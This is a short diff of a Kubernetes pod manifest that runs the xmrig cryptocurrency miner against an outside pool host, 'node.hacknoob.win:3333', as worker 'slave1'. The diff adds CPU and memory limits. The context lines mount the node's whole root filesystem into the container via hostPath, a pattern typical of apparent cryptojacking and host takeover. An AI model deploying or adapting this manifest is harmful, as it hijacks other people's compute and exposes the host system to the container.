@@ -21,10 +21,17 @@ spec:
     - node.hacknoob.win:3333
     - -u
     - slave1
+    resources:
+      requests:
+        cpu: "2"
+        memory: "250Mi"
+      limits:
+        cpu: "4"
+        memory: "400Mi"
     volumeMounts:
     - name: xmrig-volume-1
       mountPath: /
   volumes:
   - name: xmrig-volume-1
     hostPath:
-      path: /
+      path: / 
